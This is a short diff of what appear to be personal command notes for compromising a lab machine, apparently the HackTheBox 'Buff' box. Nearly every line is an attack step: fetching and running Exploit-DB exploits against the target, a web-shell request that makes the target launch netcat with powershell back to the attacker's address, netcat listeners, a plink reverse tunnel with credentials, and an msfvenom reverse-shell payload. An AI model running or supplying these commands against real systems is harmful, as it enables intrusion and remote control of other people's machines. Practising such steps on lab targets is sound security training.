@@ -2,7 +2,7 @@ mkdir buff && cd buff
 curl https://www.exploit-db.com/raw/48506 -o 48509.py
 curl https://www.exploit-db.com/raw/44470 -o 44470.py
 
-python2 48509.py http://10.10.10.198/
+python2 48509.py http://10.10.10.198:8080/
 
 cd /usr/share/windows-binaries && python2 -m SimpleHTTPServer 80
 
@@ -13,9 +13,9 @@ nc -lvnp 5000
 
 upload/kamehameha.php?telepathy=d34dp00lg1ft.exe 10.10.14.69 5000 -e powershell
 
-nc -lvnp 5005
+nc -lvnp 4444
 
-.\d34dp00lb1k3.exe -P 2222 -l root -pw toor -R 8888:0000:8888 10.10.14.69
-msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.69 LPORT=5005 -f c
+.\d34dp00lb1k3.exe -P 2222 -l root -pw toor -R 8888:127.0.0.1:8888 10.10.14.69
+msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.69 LPORT=4444 -f c
 
 python2 44470.py
